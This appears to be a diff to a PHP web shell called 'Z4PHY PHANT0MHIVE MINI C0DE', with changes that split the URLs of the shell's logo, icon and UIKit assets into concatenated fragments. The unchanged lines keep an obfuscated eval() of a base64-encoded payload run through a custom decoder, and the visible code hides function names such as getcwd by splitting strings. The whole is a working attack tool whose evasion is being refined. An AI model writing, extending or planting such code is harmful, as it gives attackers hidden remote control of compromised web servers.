@@ -155,8 +155,8 @@ function XaFV($FQS) {
 }/****/@/*55555*/null; /******/@/*55555*/eval/******/(XaFV("rVPdasIwFH4AnyKIkApSH0DnLra63WyCut3IKCVGDdSmNC3VDp9956Sxjb+orJCQk+873/lLCYGvIRbEEUrx1Gn5b950RqMsLOhPu01+G0hoLbKI+XwjVEqeCF1k1KURS2EXMoLdh8U3aCq8VLRn3CwfAUDILSZsqcVc8pKHWIgso7s059TYTGJwtHhkri2VODuvEsPKTlTwgu/lahWpJaRxgzB7INdADpcJBtBJVCDTIMMyYUllg6t1AWhZ5VGPDUNEc75JpMT0W/7EG3974xl9Hb18fXifU388Gk3pj0u7mufGq7iKK0J+gx9PEpn4oVxavjh2a7RwzquRa+1tsA103tKpE+wQGlCTdqWCTNu1ls9LELyeB9TFTrSPifhxtpKE9hVLRJwOAqgpdZrDPBEpJ5OMMa5Us93vGpz2DgR2hIeK36k6DKBz8yuiBxbM11RZs86GfTRkGe5E8hG53YXp4t9xYcAIOdVb6ugXe8uMz6cHYur61O5onRb7r869r4viSt92fw=="));
 //Z4PHY ICONS
 $s_he_ll_Name = "Z4"."PH"."Y "."PH"."ANT"."0"."MH"."IV"."E "."MI"."NI"." C"."0"."DE";
-$s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/z"."4p"."hyr"."/z"."4p"."hy"."-c0"."de"."/"."mai"."n/"."as"."set"."s/"."z4p"."hy".".p"."ng";
-$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."com"."/z4"."ph"."yr"."/"."z4"."phy"."-c0"."de/"."ma"."in/"."ass"."ets"."/c"."ie"."l."."p"."ng";
+$s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/"."z4phyr"."/"."z4phy-c0de"."/"."mai"."n/"."as"."set"."s/"."z4p"."hy".".p"."ng";
+$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."co"."m/"."z4phyr"."/"."z4phy-c0de"."/"."ma"."in/"."ass"."ets"."/c"."ie"."l."."p"."ng";
 function Z4pCwd(){
     $cw = "ge"."tc"."wd";
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
@@ -378,10 +378,10 @@ $this_url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HO
 $fontawesome_pro_version = 'v6.5.1'; //change if updated to new version
 $fontawesome_pro = 'https://kit-pro.fontawesome.com/releases/'.$fontawesome_pro_version.'/css/pro.min.css';
 /*Framework - Uikit*/
-$uikit_css = 'https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/css/uikit.min.css';
-$uikit_rtl = 'https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/css/uikit-rtl.min.css';
-$uikit_js = 'https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/js/uikit.min.js';
-$uikit_icon = 'https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/js/uikit-icons.min.js';
+$uikit_css = 'htt'.'ps'.':/'.'/cd'.'n.'.'js'.'de'.'li'.'vr'.'.n'.'et'.'/g'.'h/'.'z4phyr'.'/'.'z4phy-c0de'.'/'.'z4phy-mini'.'/c'.'ss'.'/u'.'ik'.'it'.'.m'.'in'.'.c'.'ss';
+$uikit_rtl = 'ht'.'tp'.'s:'.'//'.'cd'.'n.'.'js'.'de'.'li'.'vr'.'.n'.'et'.'/g'.'h/'.'z4phyr'.'/'.'z4phy-c0de'.'/'.'z4phy-mini'.'/cs'.'s/'.'ui'.'ki'.'t-'.'rt'.'l.m'.'in'.'.c'.'ss';
+$uikit_js = 'ht'.'tp'.'s:/'.'/c'.'dn.'.'jsd'.'el'.'iv'.'r.n'.'et'.'/gh'.'/'.'z4phyr'.'/'.'z4phy-c0de'.'/'.'z4phy-mini'.'/j'.'s/'.'uik'.'it'.'.mi'.'n.j'.'s';
+$uikit_icon = 'ht'.'tp'.'s:'.'//'.'cd'.'n.'.'js'.'de'.'li'.'vr'.'.n'.'et'.'/g'.'h/'.'z4phyr'.'/'.'z4phy-c0de'.'/'.'z4phy-mini'.'/j'.'s/'.'ui'.'ki'.'t-'.'ic'.'ons'.'.m'.'in.'.'js';
 /*Jquery*/
 $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';
